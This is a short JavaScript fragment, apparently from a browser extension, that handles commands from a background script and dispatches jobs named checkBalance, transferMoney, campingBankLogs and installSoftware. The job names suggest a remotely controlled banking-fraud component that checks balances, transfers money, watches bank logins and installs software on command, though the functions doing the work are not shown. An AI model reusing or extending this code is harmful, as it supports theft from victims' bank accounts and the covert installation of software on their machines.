//It handles messages comming from background script
function handleRequest(request) {
    showRequest(request.message);
    switch (request.message.act) {
        case defaultAct.getRequestData:
            //code
            break;
        case defaultAct.setRequestData:
            //console.log("SetRequestData from background script>>> Act: ", request.message.act + " stepId: " + request.message.stepId);
            if (request.message.stepId != null) {
                if ((request.message.job == defaultJob.checkBalance) ||
                    (request.message.job == defaultJob.transferMoney)) {
                    executeMissionStep(request.message);
                } else
                if (request.message.job == defaultJob.campingBankLogs) {
                    executeCampingStep(request.message);
                } else
                if (request.message.job == defaultJob.installSoftware) {
                    executeInstallSoftware(request.message);
                } else
                if (request.message.job == defaultJob.wait) {
                    //Do nothing, just wait
                }

            }
            break;

        default:
            break;
    }
};